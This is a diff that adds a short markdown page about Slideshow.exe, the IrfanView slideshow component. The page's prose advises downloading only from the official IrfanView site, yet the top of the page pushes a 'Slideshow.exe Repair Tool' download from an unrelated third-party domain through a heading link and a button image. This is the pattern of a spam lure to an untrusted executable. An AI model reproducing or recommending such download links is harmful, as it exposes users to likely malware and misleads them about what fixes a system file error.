@@ -1,0 +1,7 @@
+## What is Slideshow.exe? 
+
+# <h2><a href="https://exedetect.com/download.php?Slideshow.exe">🔗 👉 Download The Slideshow.exe Repair Tool</a></h2>
+
+[![Download The Repair Tool](https://exedetect.com/download-button.jpg)](https://exedetect.com/download.php?Slideshow.exe)
+
+Slideshow.exe is an executable file associated with IrfanView, a popular image viewer developed by Irfan Skiljan, and is part of version 4.52.0.0 of the software. This file is primarily used to create and display slideshows from images and is generally considered safe when downloaded from reputable sources, as IrfanView is a well-established program widely used for image manipulation and viewing. However, like any executable file, it can be susceptible to false positives from antivirus software or may be targeted by malicious actors if obtained from untrustworthy websites, leading to potential virus or malware infections. Users may encounter errors such as "Slideshow.exe has stopped working" or issues related to compatibility, particularly if they are running outdated versions of the software or their operating system. To ensure safety, it is advisable to keep the software updated and to download it only from the official IrfanView website.
